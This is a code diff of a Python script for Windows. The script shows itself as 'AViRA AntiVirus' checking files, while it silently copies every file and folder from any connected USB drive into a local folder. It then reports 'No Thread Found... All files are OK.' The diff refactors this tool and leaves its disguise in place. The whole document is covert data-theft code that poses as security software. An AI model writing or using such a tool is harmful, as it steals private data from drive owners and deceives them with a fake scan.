@@ -1,24 +1,21 @@
 from time import sleep
 
+import win32file
 from win32file import GetDriveType , GetLogicalDrives , DRIVE_REMOVABLE
 from os import chdir , listdir , path , mkdir
 from shutil import copytree , copyfile
 from progressbar import *
 
 class Mains:
-    def Reader(self):
+    def __init__(self):
+
+## region destination:
+        self.dest = "C:\\USB Files\\"
 
         if "USB Files" not in listdir("C:\\"):
             chdir("C:\\")
             mkdir("USB Files")
-
-## region First check:
-        if "USB_num" not in listdir("C:\\USB Files"):
-            f = open("C:\\USB Files\\USB_num", "w")
-            f.close()
-            self.usb_number()
-        else:
-            self.usb_number()
+## endregion
 
 
         print("\n****AViRA AntiVirus***"
@@ -26,9 +23,10 @@ class Mains:
       "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
       "Please wait while checking your files...\n")
 
+        self.usb_number()
 
     def usb_number(self):
-        chdir('C:\\USB Files\\')
+        chdir(self.dest)
         lister = listdir('.')
         Directories = []
         for i in lister:
@@ -36,25 +34,9 @@ class Mains:
                 Directories.append(i)
 
         if len(Directories) == 0 :
-            f = open("C:\\USB Files\\USB_num", "w")
-            f.writelines("0")
-            f.close()
-
+            self.usbnum = 1
         else:
-            for i in Directories:
-                i = int(i)
-            maxs = int(max(Directories))
-            # maxs += 1
-            f = open("C:\\USB Files\\USB_num", "w")
-            f.writelines(str(maxs))
-            f.close()
-
-## endregion
-
-        f = open("C:\\USB Files\\USB_num", "r+")
-        self.reader = f.readlines()
-        self.reader = self.reader[0]
-        f.close()
+            self.usbnum = int(max(Directories)) + 1
 
     def usbdrive(self):
         self.drive_list = []
@@ -67,18 +49,13 @@ class Mains:
                 t = GetDriveType(drname)
                 if t == DRIVE_REMOVABLE:
                     self.drive_list.append(drname)
-        # return drive_list
+
+        # print(self.drive_list)
 
         if self.drive_list.__len__() == 0 :
             print("No USB Connected!!!")
             sleep(4)
             exit()
-
-        self.reader = int(self.reader) +  1
-        f = open("C:\\USB Files\\USB_num", "w")
-        f.writelines(str(self.reader))
-        f.close()
-
 
     def copier(self):
         if len(self.drive_list) > 1 :
@@ -87,7 +64,7 @@ class Mains:
                 chdir(self.drive_list[x])
                 self.copy()
                 x += 1
-                self.reader += 1
+                self.usbnum += 1
         else:
             chdir(self.drive_list[0])
             self.copy()
@@ -96,72 +73,44 @@ class Mains:
 
         pwd = listdir('.')
 
-
         Files = []
         Directories = []
 
         for i in pwd:
             if path.isfile(i) == True:
                 Files.append(i)
-            else:
+            if path.isdir(i) == True:
                 Directories.append(i)
 
         widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
         bar = ProgressBar(widgets = widgets,maxval=len(pwd))
-        # bar = Bar(maxval=len(pwd))
 
         x = 1
         bar.start()
         for dir in Directories:
             try:
-                copytree(dir, "C:\\USB Files\\" + str(self.reader) + "\\" + dir)
+                # print(self.usbnum)
+                copytree(dir, self.dest + str(self.usbnum) + "\\" + dir)
                 bar.update(x)
-                # bar.next()
                 x += 1
             except :
                 bar.update(x)
-                # bar.next()
                 x += 1
         for file in Files:
             try:
-                copyfile(file, "C:\\USB Files\\"  + str(self.reader) +  "\\"  + file)
+                copyfile(file, self.dest  + str(self.usbnum) +  "\\"  + file)
                 bar.update(x)
                 x += 1
-                # bar.next()
             except :
                 bar.update(x)
                 x += 1
-                # bar.next()
         bar.finish()
 
     def final(self):
-        # time.sleep(1)
         print("\n=====No Thread Found=====\n\nAll files are OK.")
         input()
 
 M = Mains()
-M.Reader()
 M.usbdrive()
 M.copier()
 M.final()
-
-
-
-# from tqdm import tqdm
-# bar = Bar(maxval=len(pwd))
-# bar = tqdm(total=len(pwd))
-
-
-# os.chdir(drive[0])
-# print(os.listdir('.'))
-
-#
-# # import usb
-# # busses = usb.busses()
-# # for bus in busses:
-# #     devices = bus.devices
-# #     for dev in devices:
-# #         print("Device : " , dev.filename)
-#
-# # for dev in usb.core.find(find_all=True):
-# #     print("Device : ", dev.filename)
